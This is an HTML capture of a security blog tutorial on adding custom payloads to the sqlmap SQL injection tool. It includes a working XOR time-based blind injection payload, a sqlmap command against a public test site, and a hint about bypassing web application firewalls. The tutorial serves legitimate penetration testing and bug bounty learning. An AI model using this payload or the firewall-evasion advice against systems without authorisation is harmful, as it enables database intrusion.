<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://ott3rly.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fott3rly.com%2Fadvanced-sqlmap-customization%2F&#038;format=xml" />
    <style type="text/css">
      a#clickTop {
        background: #cccccc none repeat scroll 0 0;
        border-radius: 0;
        bottom: 5%;
        color: #000000;
        padding: 5px;
        right: 5%;
        min-height: 34px;
        min-width: 35px;
        font-size: 16px;
        opacity: 0.99      }

      a#clickTop i {
        color: #000000;
      }

      a#clickTop:hover,
      a#clickTop:hover i,
      a#clickTop:active,
      a#clickTop:focus {
        color: #ffffff      }

      .hvr-fade:hover,
      .hvr-fade:focus,
      .hvr-fade:active,
      .hvr-back-pulse:hover,
      .hvr-back-pulse:focus,
      .hvr-back-pulse:active,
      a#clickTop.hvr-shrink:hover,
      a#clickTop.hvr-grow:hover,
      a#clickTop.hvr-pulse:hover,
      a#clickTop.hvr-pulse-grow:hover,
      a#clickTop.hvr-pulse-shrink:hover,
      a#clickTop.hvr-push:hover,
      a#clickTop.hvr-pop:hover,
      a#clickTop.hvr-bounce-in:hover,
      a#clickTop.hvr-bounce-out:hover,
      a#clickTop.hvr-float:hover,
      a#clickTop.hvr-fade:hover,
      a#clickTop.hvr-back-pulse:hover,
      a#clickTop.hvr-bob:hover,
      a#clickTop.hvr-buzz:hover,
      a#clickTop.hvr-shadow:hover,
      a#clickTop.hvr-grow-shadow:hover,
      a#clickTop.hvr-float-shadow:hover,
      a#clickTop.hvr-glow:hover,
      a#clickTop.hvr-shadow-radial:hover,
      a#clickTop.hvr-box-shadow-outset:hover,
      a#clickTop.hvr-box-shadow-inset:hover,
      a#clickTop.hvr-bubble-top:hover,
      a#clickTop.hvr-bubble-float-top:hover,
      .hvr-radial-out:before,
      .hvr-radial-in:before,
      .hvr-bounce-to-right:before,
      .hvr-bounce-to-left:before,
      .hvr-bounce-to-bottom:before,
      .hvr-bounce-to-top:before,
      .hvr-rectangle-in:before,
      .hvr-rectangle-out:before,
      .hvr-shutter-in-horizontal:before,
      .hvr-shutter-out-horizontal:before,
      .hvr-shutter-in-vertical:before,
      .hvr-sweep-to-right:before,
      .hvr-sweep-to-left:before,
      .hvr-sweep-to-bottom:before,
      .hvr-sweep-to-top:before,
      .hvr-shutter-out-vertical:before,
      .hvr-underline-from-left:before,
      .hvr-underline-from-center:before,
      .hvr-underline-from-right:before,
      .hvr-overline-from-left:before,
      .hvr-overline-from-center:before,
      .hvr-overline-from-right:before,
      .hvr-underline-reveal:before,
      .hvr-overline-reveal:before {
        background-color: #555555;
        color: #ffffff;
        border-radius: 0;
      }

      /* Back Pulse */
      @-webkit-keyframes hvr-back-pulse {
        50% {
          background-color: #cccccc none repeat scroll 0 0;
        }
      }

      @keyframes hvr-back-pulse {
        50% {
          background-color: #cccccc none repeat scroll 0 0;
        }
      }


      .hvr-radial-out,
      .hvr-radial-in,
      .hvr-rectangle-in,
      .hvr-rectangle-out,
      .hvr-shutter-in-horizontal,
      .hvr-shutter-out-horizontal,
      .hvr-shutter-in-vertical,
      .hvr-shutter-out-vertical {
        background-color: #cccccc none repeat scroll 0 0;
      }

      .hvr-bubble-top::before,
      .hvr-bubble-float-top::before {
        border-color: transparent transparent #cccccc;
      }
    </style>

  <meta name="generator" content="Site Kit by Google 1.134.0" />
<!-- Google AdSense meta tags added by Site Kit -->
<meta name="google-adsense-platform-account" content="ca-host-pub-2644536267352236">
<meta name="google-adsense-platform-domain" content="sitekit.withgoogle.com">
<!-- End Google AdSense meta tags added by Site Kit -->
<style id="custom-background-css">
body.custom-background { background-color: #000000; }
</style>
	
<!-- Google AdSense snippet added by Site Kit -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1695117173662565&amp;host=ca-host-pub-2644536267352236" crossorigin="anonymous"></script>

<!-- End Google AdSense snippet added by Site Kit -->
<link rel="icon" href="https://ott3rly.com/wp-content/uploads/2024/02/cropped-logo_new_without_background-32x32.png" sizes="32x32" />
<link rel="icon" href="https://ott3rly.com/wp-content/uploads/2024/02/cropped-logo_new_without_background-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://ott3rly.com/wp-content/uploads/2024/02/cropped-logo_new_without_background-180x180.png" />
<meta name="msapplication-TileImage" content="https://ott3rly.com/wp-content/uploads/2024/02/cropped-logo_new_without_background-270x270.png" />
<style>.shorten_url { 
	   padding: 10px 10px 10px 10px ; 
	   border: 1px solid #AAAAAA ; 
	   background-color: #EEEEEE ;
}</style></head>

<body class="post-template-default single single-post postid-783 single-format-standard custom-background wp-embed-responsive dark">
			<div id="site-navigation" class="sm-mobile-menu">
		<!-- Button trigger modal -->
		<div class="container">
			<div class="small-menubar">
				<div class="sm-logo">
											<h1 class="site-title"><a href="https://ott3rly.com/" rel="home">Ott3rly</a></h1>
									</div>
				<button type="button" class="btn smallmenubtn" data-bs-toggle="modal" data-bs-target="#smallmenu">
					Menu				</button>
			</div>
		</div>

		<!-- Modal -->
		<div class="modal fade" id="smallmenu" tabindex="-1" aria-labelledby="smallmenuLabel" aria-hidden="true">
			<div class="modal-dialog">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
					</div>
					<nav id="sm-navigation" class="sm-main-navigation">
						<div class="menu-top-menu-container"><ul id="resume-x-menu" class="resume-x-menu"><li id="menu-item-46" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-46"><a href="https://ott3rly.com">Blog</a></li>
<li id="menu-item-59" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-59"><a href="https://ott3rly.com/about/">About</a></li>
<li id="menu-item-920" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-920"><a href="https://ott3rly.com/google-dorks-generator/">Google Dorking</a></li>
<li id="menu-item-919" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-919"><a href="https://ott3rly.com/github-dorks-generator/">Github Dorking</a></li>
<li id="menu-item-918" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-918"><a href="https://ott3rly.com/patreon">Support Me</a></li>
</ul></div>					</nav><!-- #site-navigation -->
				</div>
			</div>
		</div>
	</div>


			<div class="container">
		<a class="skip-link screen-reader-text" href="#primary">Skip to content</a>

		<div class="row">
				<div class="col-lg-4 profile-side">
		<div class="author-sticky">
			<div class="author-section">
				<div class="author">
					<div class="author-img">
						<img src="https://ott3rly.com/wp-content/uploads/2023/10/linkedin.jpeg" alt="Profile Image">
					</div>
					<div class="author-all-imf">
													<h3 class="author-name">Mantas Sabeckis</h3>
																			<h4 class="author-subtitle">Security Researcher</h4>
						
						<div class="author-social-icons">
																													<a href="https://twitter.com/ott3rly"><i class="fab fa-twitter"></i></a>
																						<a href="https://ott3rly.com/youtube"><i class="fab fa-youtube"></i></a>
																						<a href="https://www.linkedin.com/in/otterly/"><i class="fab fa-linkedin-in"></i></a>
													</div>
													<div class="author-all-btn">
								<a href="/index.php/contacts/" class="main-btn">Contact</a>
							</div>
											</div>
				</div>
			</div>
		</div>
	</div>

			<div class="col-lg-8 rxmain-content">
				<div id="page" class="site all-details-section px-3">
					<header id="masthead" class="site-header text-center">
						
	<div class="resume-x-logo-section">
		<div class="container">
			<div class="head-logo-sec">
													<div class="site-branding brand-text">
													<h1 class="site-title"><a href="https://ott3rly.com/" rel="home">Ott3rly</a></h1>
															<p class="site-description">Amazing Cyber Security</p>
													
					</div><!-- .site-branding -->
							</div>
		</div>
	</div>




	<div class="menu-bar text-center">
		<div class="container">
			<div class="resume-x-container menu-inner">
				<nav id="site-navigation" class="main-navigation">
					<div class="menu-top-menu-container"><ul id="resume-x-menu" class="resume-x-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-46"><a href="https://ott3rly.com">Blog</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-59"><a href="https://ott3rly.com/about/">About</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-920"><a href="https://ott3rly.com/google-dorks-generator/">Google Dorking</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-919"><a href="https://ott3rly.com/github-dorks-generator/">Github Dorking</a></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-918"><a href="https://ott3rly.com/patreon">Support Me</a></li>
</ul></div>				</nav><!-- #site-navigation -->
			</div>
		</div>
	</div>

					</header><!-- #masthead -->
<div class="rx-main mt-5 mb-5 pt-5 pb-5">
	<div class="row">
				<div class="col-lg-12">
			<main id="primary" class="site-main">

				
	<article id="post-783" class="post-783 post type-post status-publish format-standard hentry category-blog category-bug-bounty-tips category-infosec-tools category-sqli tag-bug-bounty tag-bug-bounty-hunting tag-bug-bounty-tips tag-cybersecurity tag-information-security tag-infosec tag-sqli tag-sqlmap">
		<div class="xpost-item shadow pb-5 mb-5">
						<div class="xpost-text p-3">
				<header class="entry-header pb-4">
					<h1 class="entry-title">Advanced SQLMap Customization</h1>						<div class="entry-meta">
							<span class="posted-on">Posted on <a href="https://ott3rly.com/advanced-sqlmap-customization/" rel="bookmark"><time class="entry-date published" datetime="2024-07-08T17:00:00+03:00">July 8, 2024</time></a></span> <span class="posted-on">Updated on <a href="https://ott3rly.com/advanced-sqlmap-customization/" rel="bookmark"><time class="updated" datetime="2024-06-21T23:24:42+03:00">June 21, 2024</time></a></span><span class="byline"> by <span class="author vcard"><a class="url fn n" href="https://ott3rly.com/author/otterly/">otterly</a></span></span>						</div><!-- .entry-meta -->
									</header><!-- .entry-header -->
				<div class="entry-content">
					
<p>Do you know that you can add custom payloads to the SQLMap? This tool is powerful out of the box, but with advanced customization, you can unleash its full potential! Let&#8217;s get ready to improve your SQL injection automation skills!</p>



<figure class="wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
<iframe title="Andvanced SQLMap Customization" width="1170" height="658" src="https://www.youtube.com/embed/ca3feQGs4ZQ?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
</div></figure>



<h2 class="wp-block-heading">Introduction</h2>



<p>There are many ways people usually customize SQLmap like using extra headers, random user agents, tampering scripts, or delays between requests. Fine-tuning those options could sometimes help to fuzz specific endpoints or avoid Web Application Firewall rules. Although this tool is pretty good by its defaults, you could still add your own twist to it. Certain configuration files describe the payloads the SQLMap sends. For different people, those configuration files might be in different locations. It depends on which operating system you use, how you install it, do you already have it in your OS (like Kali Linux, or ParrotOS), etc. </p>



<h2 class="wp-block-heading">Locating Configuration Files in GitHub</h2>



<p>What it comes down to, are those particular XML files that have their payload described. As we can see on the GitHub sqlmap repository right here:</p>



<figure class="wp-block-image size-large"><img fetchpriority="high" decoding="async" width="1024" height="597" src="https://ott3rly.com/wp-content/uploads/2024/06/Screenshot-from-2024-06-21-21-36-25-1024x597.png" alt="" class="wp-image-784" srcset="https://ott3rly.com/wp-content/uploads/2024/06/Screenshot-from-2024-06-21-21-36-25-1024x597.png 1024w, https://ott3rly.com/wp-content/uploads/2024/06/Screenshot-from-2024-06-21-21-36-25-300x175.png 300w, https://ott3rly.com/wp-content/uploads/2024/06/Screenshot-from-2024-06-21-21-36-25-768x448.png 768w, https://ott3rly.com/wp-content/uploads/2024/06/Screenshot-from-2024-06-21-21-36-25.png 1079w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>



<p>There are different types of SQL injection payloads described in each of the files. For example, let&#8217;s look into the <a href="https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/payloads/boolean_blind.xml">boolean_blind.xml</a> file:</p>



<figure class="wp-block-image size-full"><img decoding="async" width="888" height="744" src="https://ott3rly.com/wp-content/uploads/2024/06/Screenshot-from-2024-06-21-21-38-09.png" alt="" class="wp-image-785" srcset="https://ott3rly.com/wp-content/uploads/2024/06/Screenshot-from-2024-06-21-21-38-09.png 888w, https://ott3rly.com/wp-content/uploads/2024/06/Screenshot-from-2024-06-21-21-38-09-300x251.png 300w, https://ott3rly.com/wp-content/uploads/2024/06/Screenshot-from-2024-06-21-21-38-09-768x643.png 768w" sizes="(max-width: 888px) 100vw, 888px" /></figure>



<p>This file does contain the most explanation of how you can build your own SQLmap query. It does contain a comment where it actually explains everything that you need to do. There is a <strong>&lt;root&gt;</strong> and inside that <strong>&lt;root&gt;</strong>, there are multiple test cases written:</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="995" height="609" src="https://ott3rly.com/wp-content/uploads/2024/06/Screenshot-from-2024-06-21-21-39-40.png" alt="" class="wp-image-786" srcset="https://ott3rly.com/wp-content/uploads/2024/06/Screenshot-from-2024-06-21-21-39-40.png 995w, https://ott3rly.com/wp-content/uploads/2024/06/Screenshot-from-2024-06-21-21-39-40-300x184.png 300w, https://ott3rly.com/wp-content/uploads/2024/06/Screenshot-from-2024-06-21-21-39-40-768x470.png 768w" sizes="(max-width: 995px) 100vw, 995px" /></figure>



<h2 class="wp-block-heading">Test Case XML Object Explanation</h2>



<p>Each of the defined cases will have:</p>



<p><strong>&lt;title&gt;</strong> &#8211; the name of the test.</p>



<p><strong>&lt;stype</strong>&gt; &#8211; numerically defines the test type. There are multiple values that you can write down &#8211; if you are constructing Boolean-Based SQL injection it will be the value of 1, error-based &#8211; 2… Inside different types of files, there will be S types of different numbers:</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="972" height="508" src="https://ott3rly.com/wp-content/uploads/2024/06/image-25.png" alt="" class="wp-image-788" srcset="https://ott3rly.com/wp-content/uploads/2024/06/image-25.png 972w, https://ott3rly.com/wp-content/uploads/2024/06/image-25-300x157.png 300w, https://ott3rly.com/wp-content/uploads/2024/06/image-25-768x401.png 768w" sizes="(max-width: 972px) 100vw, 972px" /></figure>



<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="617" src="https://ott3rly.com/wp-content/uploads/2024/06/image-26-1024x617.png" alt="" class="wp-image-789" srcset="https://ott3rly.com/wp-content/uploads/2024/06/image-26-1024x617.png 1024w, https://ott3rly.com/wp-content/uploads/2024/06/image-26-300x181.png 300w, https://ott3rly.com/wp-content/uploads/2024/06/image-26-768x463.png 768w, https://ott3rly.com/wp-content/uploads/2024/06/image-26.png 1117w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>



<p>The important thing to note is that if you want to select a different sqlmap type of attack, you can do this with the <strong>&#8211;technique=T</strong> flag, where the value is the first letter of the SQL injection attack. For example, T &#8211; stands for Time-based, B &#8211; Boolean, E &#8211; Error-based, etc. It doesn&#8217;t mean that sqlmap will run all the queries of that file because there are other things like <strong>level</strong>.</p>



<p><strong>&lt;level></strong> &#8211; describes how many requests the program will execute. The higher the level, the more payloads will be selected from the file. It will pick the level selected with command <strong>&#8211;level</strong> and lower levels. For example, if you specified <strong>&#8211;level=3</strong> in the command, it will filter payloads with levels <strong>1</strong>, <strong>2</strong>, and <strong>3</strong>.</p>



<p><strong>&lt;risk></strong> &#8211; defines the likelihood of payload to damage data Integrity. If you specify <strong>&#8211;risk=3 </strong>in your CLI sqlmap query, it will run the highest risk queries &#8211; those queries have a likelihood that you could destroy something on the server. <strong>I highly recommend not doing this on production servers.</strong> If it&#8217;s a UAT, testing, or staging environment &#8211; you&#8217;re good to go.</p>



<p><strong>&lt;vector></strong> &#8211; specify your payload here.</p>



<p><strong>Other objects</strong> will depend on the attack type, so I suggest just copying the following payload and doing something similar.</p>



<h2 class="wp-block-heading">Locating Payload Configuration Locally</h2>



<p>We&#8217;re going to be building a time-based query. Let&#8217;s open the <a href="https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/payloads/time_blind.xml">time_blind.xml</a> file, as it could give us some headstart. I suggest copying the first query for replacing the values later on for your custom payload:</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="975" height="386" src="https://ott3rly.com/wp-content/uploads/2024/06/image-27.png" alt="" class="wp-image-790" srcset="https://ott3rly.com/wp-content/uploads/2024/06/image-27.png 975w, https://ott3rly.com/wp-content/uploads/2024/06/image-27-300x119.png 300w, https://ott3rly.com/wp-content/uploads/2024/06/image-27-768x304.png 768w" sizes="(max-width: 975px) 100vw, 975px" /></figure>



<p>Time to locate the file. There could be different file paths where you could find <strong>time_blind.xml</strong> locally:</p>



<ul class="wp-block-list">
<li>If you installed it from the source, it will be located under <strong>sqlmap/data/xml/payloads/time_blind.xml</strong></li>



<li>If you used <strong>pip3 </strong>to install it, it will be in your home directory, in the <strong>.local</strong> directory, and its subdirectories depending on your python and pip version.</li>



<li>If you use package managers like APT using Ubuntu, Kali Linux, or Parrot OS, it will be installed somewhere under <strong>/usr/share</strong> directory.</li>
</ul>



<p>I suggest using the <strong>find </strong>command in case you having difficulties locating it:</p>



<pre class="wp-block-code"><code>find / -name time_blind.xml -type f 2>/dev/null</code></pre>



<ul class="wp-block-list">
<li><strong>find</strong> &#8211; the command to search for the file.</li>



<li><strong>/</strong> &#8211; specifies the starting point of the search.</li>



<li><strong>-name</strong> <strong>time_blind.xml</strong> &#8211; the filename of what we are looking for.</li>



<li><strong>-type f</strong> &#8211; specify that we are looking file, not a directory.</li>



<li><strong>2>/dev/null</strong> &#8211; suppress the &#8220;Permission denied&#8221; errors.</li>
</ul>



<p>In my case, this file was located under the <strong>/usr/share/sqlmap/data/xml/payloads</strong> directory:</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="914" height="147" src="https://ott3rly.com/wp-content/uploads/2024/06/image-28.png" alt="" class="wp-image-791" srcset="https://ott3rly.com/wp-content/uploads/2024/06/image-28.png 914w, https://ott3rly.com/wp-content/uploads/2024/06/image-28-300x48.png 300w, https://ott3rly.com/wp-content/uploads/2024/06/image-28-768x124.png 768w" sizes="(max-width: 914px) 100vw, 914px" /></figure>



<h2 class="wp-block-heading">Building Custom Payload</h2>



<p>I have already edited that file and added the following payload which took inspiration from GitHub:</p>



<pre class="wp-block-code"><code>&lt;test>
    &lt;title>XOR time-based blind (query SLEEP)&lt;/title>
    &lt;stype>5&lt;/stype>
    &lt;level>1&lt;/level>
    &lt;risk>1&lt;/risk>
    &lt;clause>1,2,3,8,9&lt;/clause>
    &lt;where>1&lt;/where>
    &lt;vector>&#91;RANDNUM]'XOR(if(now()=sysdate(),sleep(&#91;SLEEPTIME]),0))XOR'&#91;RANDSTR]&lt;/vector>
    &lt;request>
        &lt;payload>&#91;RANDNUM]'XOR(if(now()=sysdate(),sleep(&#91;SLEEPTIME]),0))XOR'&#91;RANDSTR]&lt;/payload>
    &lt;/request>
    &lt;response>
        &lt;time>&#91;SLEEPTIME]&lt;/time>
    &lt;/response>
&lt;/test></code></pre>



<p>I have pasted this at the top of the file under <strong>&lt;root></strong>:</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="883" height="475" src="https://ott3rly.com/wp-content/uploads/2024/06/image-29.png" alt="" class="wp-image-792" srcset="https://ott3rly.com/wp-content/uploads/2024/06/image-29.png 883w, https://ott3rly.com/wp-content/uploads/2024/06/image-29-300x161.png 300w, https://ott3rly.com/wp-content/uploads/2024/06/image-29-768x413.png 768w" sizes="(max-width: 883px) 100vw, 883px" /></figure>



<p>It is the XOR time-based blind sleep query. The <strong>&lt;stype></strong> is 5 since all time-based payloads use this. The <strong>&lt;risk></strong> and <strong>&lt;level > </strong>are 1 because by default the sqlmap will use the lowest level and risk possible. The <strong>&lt;clause></strong> and <strong>&lt;payload></strong> I copied from the following <strong>&lt;test></strong> case and I have replaced it to use the unique query. You can see that there are some variables being used such as <strong>[RANDNUM]</strong>, <strong>[SLEEPTIME]</strong>, and <strong>[RANDSTR]</strong> that are pretty self-explanatory:</p>



<ul class="wp-block-list">
<li><strong>[RANDNUM]</strong> &#8211; this variable will randomize a number. </li>



<li><strong>[RANDSTR]</strong> &#8211; will randomize a string.</li>



<li><strong>[SLEEPTIME]</strong> &#8211; will pick a random time for sleep query, unless you specify it with the <strong>&#8211;time-sec</strong> option.</li>
</ul>



<h2 class="wp-block-heading">Running Custom SQLMap Payload</h2>



<p>If you want to run only this specific query, it won&#8217;t be possible. But you can limit the requests sent together with your newly constructed test case. To make sure that this query will be run you should do the following command:</p>



<pre class="wp-block-code"><code>sqlmap -u 'http://testphp.vulnweb.com/listproducts.php?cat=1' --technique=T</code></pre>



<p>In this case, it will hit the <strong>XOR time-based blind (query SLEEP)</strong> test case since it uses the level and risk of 1 as it comes by default of sqlmap:</p>



<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="388" src="https://ott3rly.com/wp-content/uploads/2024/06/image-30-1024x388.png" alt="" class="wp-image-794" srcset="https://ott3rly.com/wp-content/uploads/2024/06/image-30-1024x388.png 1024w, https://ott3rly.com/wp-content/uploads/2024/06/image-30-300x114.png 300w, https://ott3rly.com/wp-content/uploads/2024/06/image-30-768x291.png 768w, https://ott3rly.com/wp-content/uploads/2024/06/image-30.png 1350w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>



<p>Additionally, I also recommend adding <strong>&#8211;proxy=http://127.0.0.1:8080</strong> value to the end of sqlmap command, in case you want to see the requests sent to the website.</p>



<h2 class="wp-block-heading">Last Things</h2>



<p>Hopefully, you learned something new and you could use this for some WAF bypasses as well. Thank you for stopping by and enjoy the journey!</p>



<p>If you find this information useful, please share this article on your social media, I will greatly appreciate it! I am active on <a href="https://ott3rly.com/twitter" target="_blank" rel="noreferrer noopener">Twitter</a>, check out some content I post there daily! If you are interested in video content, check my <a href="https://ott3rly.com/youtube" target="_blank" rel="noreferrer noopener">YouTube</a>. Also, if you want to reach me personally, you can visit my <a href="https://ott3rly.com/discord" target="_blank" rel="noreferrer noopener">Discord</a> server. Cheers!</p>
<div class='heateorSssClear'></div><div  class='heateor_sss_sharing_container heateor_sss_horizontal_sharing' data-heateor-sss-href='https://ott3rly.com/pqlz'><div class='heateor_sss_sharing_title' style="font-weight:bold" >Share with your friends</div><div class="heateor_sss_sharing_ul"><a aria-label="X" class="heateor_sss_button_x" href="https://twitter.com/intent/tweet?text=Advanced%20SQLMap%20Customization&url=https%3A%2F%2Fott3rly.com%2Fpqlz" title="X" rel="nofollow noopener" target="_blank" style="font-size:32px!important;box-shadow:none;display:inline-block;vertical-align:middle"><span class="heateor_sss_svg heateor_sss_s__default heateor_sss_s_x" style="background-color:#2a2a2a;width:32px;height:32px;border-radius:999px;display:inline-block;opacity:1;float:left;font-size:32px;box-shadow:none;display:inline-block;font-size:16px;padding:0 4px;vertical-align:middle;background-repeat:repeat;overflow:hidden;padding:0;cursor:pointer;box-sizing:content-box"><svg width="100%" height="100%" style="display:block;border-radius:999px;" focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#fff" d="M21.751 7h3.067l-6.7 7.658L26 25.078h-6.172l-4.833-6.32-5.531 6.32h-3.07l7.167-8.19L6 7h6.328l4.37 5.777L21.75 7Zm-1.076 16.242h1.7L11.404 8.74H9.58l11.094 14.503Z"></path></svg></span></a><a aria-label="Linkedin" class="heateor_sss_button_linkedin" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fott3rly.com%2Fpqlz" title="Linkedin" rel="nofollow noopener" target="_blank" style="font-size:32px!important;box-shadow:none;display:inline-block;vertical-align:middle"><span class="heateor_sss_svg heateor_sss_s__default heateor_sss_s_linkedin" style="background-color:#0077b5;width:32px;height:32px;border-radius:999px;display:inline-block;opacity:1;float:left;font-size:32px;box-shadow:none;display:inline-block;font-size:16px;padding:0 4px;vertical-align:middle;background-repeat:repeat;overflow:hidden;padding:0;cursor:pointer;box-sizing:content-box"><svg style="display:block;border-radius:999px;" focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 32 32"><path d="M6.227 12.61h4.19v13.48h-4.19V12.61zm2.095-6.7a2.43 2.43 0 0 1 0 4.86c-1.344 0-2.428-1.09-2.428-2.43s1.084-2.43 2.428-2.43m4.72 6.7h4.02v1.84h.058c.56-1.058 1.927-2.176 3.965-2.176 4.238 0 5.02 2.792 5.02 6.42v7.395h-4.183v-6.56c0-1.564-.03-3.574-2.178-3.574-2.18 0-2.514 1.7-2.514 3.46v6.668h-4.187V12.61z" fill="#fff"></path></svg></span></a><a aria-label="Facebook" class="heateor_sss_facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fott3rly.com%2Fpqlz" title="Facebook" rel="nofollow noopener" target="_blank" style="font-size:32px!important;box-shadow:none;display:inline-block;vertical-align:middle"><span class="heateor_sss_svg" style="background-color:#0765FE;width:32px;height:32px;border-radius:999px;display:inline-block;opacity:1;float:left;font-size:32px;box-shadow:none;display:inline-block;font-size:16px;padding:0 4px;vertical-align:middle;background-repeat:repeat;overflow:hidden;padding:0;cursor:pointer;box-sizing:content-box"><svg style="display:block;border-radius:999px;" focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 32 32"><path fill="#fff" d="M28 16c0-6.627-5.373-12-12-12S4 9.373 4 16c0 5.628 3.875 10.35 9.101 11.647v-7.98h-2.474V16H13.1v-1.58c0-4.085 1.849-5.978 5.859-5.978.76 0 2.072.15 2.608.298v3.325c-.283-.03-.775-.045-1.386-.045-1.967 0-2.728.745-2.728 2.683V16h3.92l-.673 3.667h-3.247v8.245C23.395 27.195 28 22.135 28 16Z"></path></svg></span></a><a aria-label="Reddit" class="heateor_sss_button_reddit" href="http://reddit.com/submit?url=https%3A%2F%2Fott3rly.com%2Fpqlz&title=Advanced%20SQLMap%20Customization" title="Reddit" rel="nofollow noopener" target="_blank" style="font-size:32px!important;box-shadow:none;display:inline-block;vertical-align:middle"><span class="heateor_sss_svg heateor_sss_s__default heateor_sss_s_reddit" style="background-color:#ff5700;width:32px;height:32px;border-radius:999px;display:inline-block;opacity:1;float:left;font-size:32px;box-shadow:none;display:inline-block;font-size:16px;padding:0 4px;vertical-align:middle;background-repeat:repeat;overflow:hidden;padding:0;cursor:pointer;box-sizing:content-box"><svg style="display:block;border-radius:999px;" focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="-3.5 -3.5 39 39"><path d="M28.543 15.774a2.953 2.953 0 0 0-2.951-2.949 2.882 2.882 0 0 0-1.9.713 14.075 14.075 0 0 0-6.85-2.044l1.38-4.349 3.768.884a2.452 2.452 0 1 0 .24-1.176l-4.274-1a.6.6 0 0 0-.709.4l-1.659 5.224a14.314 14.314 0 0 0-7.316 2.029 2.908 2.908 0 0 0-1.872-.681 2.942 2.942 0 0 0-1.618 5.4 5.109 5.109 0 0 0-.062.765c0 4.158 5.037 7.541 11.229 7.541s11.22-3.383 11.22-7.541a5.2 5.2 0 0 0-.053-.706 2.963 2.963 0 0 0 1.427-2.51zm-18.008 1.88a1.753 1.753 0 0 1 1.73-1.74 1.73 1.73 0 0 1 1.709 1.74 1.709 1.709 0 0 1-1.709 1.711 1.733 1.733 0 0 1-1.73-1.711zm9.565 4.968a5.573 5.573 0 0 1-4.081 1.272h-.032a5.576 5.576 0 0 1-4.087-1.272.6.6 0 0 1 .844-.854 4.5 4.5 0 0 0 3.238.927h.032a4.5 4.5 0 0 0 3.237-.927.6.6 0 1 1 .844.854zm-.331-3.256a1.726 1.726 0 1 1 1.709-1.712 1.717 1.717 0 0 1-1.712 1.712z" fill="#fff"/></svg></span></a><a aria-label="Email" class="heateor_sss_email" href="https://ott3rly.com/pqlz" onclick="event.preventDefault();window.open('mailto:?subject=' + decodeURIComponent('Advanced%20SQLMap%20Customization').replace('&', '%26') + '&body=https%3A%2F%2Fott3rly.com%2Fpqlz', '_blank')" title="Email" rel="nofollow noopener" style="font-size:32px!important;box-shadow:none;display:inline-block;vertical-align:middle"><span class="heateor_sss_svg" style="background-color:#649a3f;width:32px;height:32px;border-radius:999px;display:inline-block;opacity:1;float:left;font-size:32px;box-shadow:none;display:inline-block;font-size:16px;padding:0 4px;vertical-align:middle;background-repeat:repeat;overflow:hidden;padding:0;cursor:pointer;box-sizing:content-box"><svg style="display:block;border-radius:999px;" focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="-.75 -.5 36 36"><path d="M 5.5 11 h 23 v 1 l -11 6 l -11 -6 v -1 m 0 2 l 11 6 l 11 -6 v 11 h -22 v -11" stroke-width="1" fill="#fff"></path></svg></span></a><a class="heateor_sss_more" title="More" rel="nofollow noopener" style="font-size: 32px!important;border:0;box-shadow:none;display:inline-block!important;font-size:16px;padding:0 4px;vertical-align: middle;display:inline;" href="https://ott3rly.com/pqlz" onclick="event.preventDefault()"><span class="heateor_sss_svg" style="background-color:#ee8e2d;width:32px;height:32px;border-radius:999px;display:inline-block!important;opacity:1;float:left;font-size:32px!important;box-shadow:none;display:inline-block;font-size:16px;padding:0 4px;vertical-align:middle;display:inline;background-repeat:repeat;overflow:hidden;padding:0;cursor:pointer;box-sizing:content-box;" onclick="heateorSssMoreSharingPopup(this, 'https://ott3rly.com/pqlz', 'Advanced%20SQLMap%20Customization', 'Advanced%20SQLMap%20Customization' )"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="-.3 0 32 32" version="1.1" width="100%" height="100%" style="display:block;border-radius:999px;" xml:space="preserve"><g><path fill="#fff" d="M18 14V8h-4v6H8v4h6v6h4v-6h6v-4h-6z" fill-rule="evenodd"></path></g></svg></span></a></div><div class="heateorSssClear"></div></div><div class='heateorSssClear'></div>				</div><!-- .entry-content -->
				<footer class="entry-footer">
